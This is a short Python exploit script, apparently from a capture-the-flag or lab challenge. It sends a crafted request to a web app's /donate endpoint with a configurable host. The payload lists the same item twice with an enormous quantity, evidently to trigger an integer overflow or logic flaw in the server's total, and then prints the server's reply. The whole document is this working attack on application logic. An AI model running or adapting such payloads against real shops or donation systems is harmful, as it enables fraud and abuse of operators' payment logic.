import requests
import re
import json

HOST = "http://localhost:3000" # Change this
data = { 
    'items': [
        {"id": 4, "quantity": 9000000000000000000000},
        {"id": 4, "quantity": 9000000000000000000000}
    ]
}

resp = requests.post(HOST + "/donate", json=data).content
resp_json = json.loads(resp)
print(resp_json['message'])